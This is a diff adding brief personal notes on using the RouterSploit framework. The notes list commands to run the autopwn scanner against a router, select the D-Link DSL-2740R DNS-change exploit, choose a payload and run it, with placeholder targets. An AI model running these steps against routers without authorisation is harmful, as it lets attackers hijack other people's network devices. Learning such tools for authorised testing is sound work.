@@ -1,0 +1,46 @@
+ROUTER SPLOIT
+
+#1 TO RUN 
+rsf.py 
+
+# LOOK UP AVAILABLE SCANNERS
+search scanners 
+
+# CHOOSE SCANNER 
+use scanners/autopwn
+
+# SEE SCANNER OPTIONS 
+show options 
+
+# SET TARGET
+set target 192.x.x.x
+
+# RUN TARGET
+run 
+
+# USE EXPLOIT (GET EXPLOIT FROM SCAN)  
+use exploits/routers/dlink/dsl_2740r_dns_change
+
+# SHOW OPTIONS
+show options 
+
+# FILL IN REQUIRED PARAMATERS FROM OPTIONS ABOVE 
+set target {etc etc}
+
+# RUN
+run 
+
+# SEE WHAT PAYLOADS ARE AVAILABLE
+show paylaods 
+
+# SELECT PAYLOAD
+set payload {payload from above}
+
+# Show options of payload 
+show options 
+
+# SET PARAMATERS
+set {paramaters from before}
+
+# Execute payload
+run 
